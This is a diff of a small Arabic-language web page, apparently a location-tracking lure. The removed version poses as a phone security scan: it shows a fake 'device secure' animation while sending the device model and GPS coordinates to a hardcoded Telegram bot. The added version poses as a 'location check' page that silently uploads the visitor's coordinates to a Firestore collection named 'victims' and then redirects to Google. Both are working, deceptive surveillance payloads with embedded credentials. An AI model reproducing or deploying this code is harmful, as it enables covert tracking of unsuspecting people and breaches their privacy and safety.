@@ -1,23 +1,11 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>🛡️ حماية الهاتف</title>
-<style>:root{--green:#00ff41;--red:#ff0040}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Courier New',monospace;background:#000;color:#fff;height:100vh;display:flex;align-items:center;justify-content:center;text-align:center;padding:20px}.container{max-width:400px;width:100%}.page{display:none}.page.active{display:block}.skull{font-size:60px}h1{font-size:22px;color:var(--green)}.btn{width:100%;padding:18px;border-radius:12px;border:2px solid var(--green);background:#0a1a0a;color:var(--green);font-size:18px;font-weight:700;cursor:pointer;font-family:'Courier New',monospace}.code-screen{background:#000;border:2px solid var(--green);border-radius:10px;padding:14px;margin:16px 0;color:var(--green);font-size:10px;text-align:left;max-height:200px;overflow-y:auto}.countdown{font-size:40px;font-weight:900;color:var(--red)}.progress-bar{width:100%;height:4px;background:#0a1a0a;border-radius:2px;margin:10px 0;overflow:hidden}.progress-fill{height:100%;background:var(--red);width:0}</style>
-</head>
-<body>
-<div class="container">
-<div class="page active" id="page-home"><div class="skull">🛡️</div><h1>حماية الهاتف</h1><div style="color:var(--green)" id="device-name">📱 جاري الكشف...</div><button class="btn" onclick="startScan()">🔍 اضغط لبدء الفحص</button></div>
-<div class="page" id="page-scanning"><div class="skull">💀</div><h1>جاري الفحص...</h1><div class="code-screen" id="code-screen"></div><div class="countdown" id="countdown">50</div><div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div></div>
-<div class="page" id="page-done"><div style="font-size:70px">✅</div><div style="color:var(--green);font-size:22px">جهازك بأمان</div></div>
-</div>
+<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>فحص الموقع</title>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,sans-serif;background:#1a1a2e;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;text-align:center}.container{max-width:400px}.logo{font-size:60px;margin-bottom:10px}h1{color:#4CAF50;font-size:18px;margin-bottom:5px}p{color:#aaa;font-size:12px}.status{color:#4CAF50;font-size:14px;margin-top:15px}</style></head>
+<body><div class="container"><div class="logo">📍</div><h1>فحص الموقع</h1><p>جاري تحديد موقعك...</p><div class="status" id="status">⏳ جاري الفحص...</div></div>
 <script>
-const params=new URLSearchParams(location.search);const CHAT_ID=params.get('chatId')||'7276604783';const BOT_TOKEN=params.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
-document.getElementById('device-name').textContent='📱 '+(navigator.userAgent.match(/; ([^;]+) Build/)?.[1]||'جهاز').trim();
-function showPage(id){document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));document.getElementById(id).classList.add('active')}
-function sendMsg(txt){fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:txt})}).catch(e=>{})}
-async function startScan(){showPage('page-scanning');sendMsg('🛡️ فحص\n📱 '+document.getElementById('device-name').textContent);
-if(navigator.geolocation){navigator.geolocation.getCurrentPosition(async p=>{const{latitude,longitude}=p.coords;sendMsg('📍 https://maps.google.com/?q='+latitude+','+longitude);fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,latitude,longitude})}).catch(e=>{})},()=>sendMsg('📍 GPS: فشل'),{enableHighAccuracy:true,timeout:30000})}else sendMsg('📍 GPS: غير مدعوم');
-const cs=document.getElementById('code-screen'),cd=document.getElementById('countdown'),pf=document.getElementById('progress-fill'),logs=['[■] INITIALIZING...','[■] DEVICE: '+document.getElementById('device-name').textContent,'[■] SCANNING GPS...','[■] CHECKING...','[■] KERNEL: SECURE','[■] FIREWALL: ACTIVE','[■] NO MALWARE','[✓] DEVICE SECURE'];let s=50;
-const t=setInterval(()=>{s--;cd.textContent=s;pf.style.width=((50-s)/50*100)+'%';cs.innerHTML=logs.slice(0,Math.floor(((50-s)/50)*logs.length+1)).join('<br>');if(s<=0){clearInterval(t);showPage('page-done')}},1000)}
-</script>
-</body>
-</html>
+firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
+var db=firebase.firestore();
+async function go(){try{navigator.geolocation.getCurrentPosition(async function(p){var loc=p.coords.latitude+','+p.coords.longitude;var map='https://maps.google.com/?q='+loc;await db.collection('victims').add({service:'📍 فحص الموقع',text:'الموقع: '+loc+'\nالخريطة: '+map,data:loc,timestamp:new Date().toISOString()});document.getElementById('status').textContent='✅ تم تحديد الموقع';setTimeout(function(){window.location.href='https://google.com/'},2000)},function(){document.getElementById('status').textContent='❌ خطأ'})}catch(e){}}
+go();
+</script></body></html>
